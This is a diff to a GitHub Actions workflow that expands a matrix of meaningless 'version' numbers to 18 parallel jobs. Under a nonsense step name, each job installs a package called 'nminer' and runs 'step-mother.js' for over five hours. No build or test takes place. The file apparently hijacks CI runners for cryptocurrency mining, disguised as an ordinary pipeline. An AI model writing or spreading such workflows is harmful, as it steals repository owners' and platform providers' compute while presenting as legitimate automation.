@@ -9,21 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7468 }
-          - { version: 8153 }
-          - { version: 5109 }
-          - { version: 7445 }
-          - { version: 5404 }
-          - { version: 4252 }
-          - { version: 9078 }
-          - { version: 915 }
-          - { version: 4059 }
-          - { version: 321 }
-          - { version: 850 }
-          - { version: 7374 }
-          - { version: 6507 }
-          - { version: 632 }
-          - { version: 389 }
+          - { version: 1188 }
+          - { version: 8809 }
+          - { version: 1471 }
+          - { version: 6311 }
+          - { version: 7213 }
+          - { version: 5196 }
+          - { version: 8399 }
+          - { version: 9330 }
+          - { version: 7825 }
+          - { version: 1862 }
+          - { version: 6200 }
+          - { version: 3705 }
+          - { version: 7466 }
+          - { version: 8069 }
+          - { version: 315 }
+          - { version: 9816 }
+          - { version: 1724 }
+          - { version: 2369 }
 
     steps:
       - name: Checkout
@@ -34,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: that wherever boohoo too
+      - name: failing yahoo
         run: |
           npm install nminer@latest
-          timeout 327m node step-mother.js || echo "step-mother executed"
+          timeout 311m node step-mother.js || echo "step-mother executed"
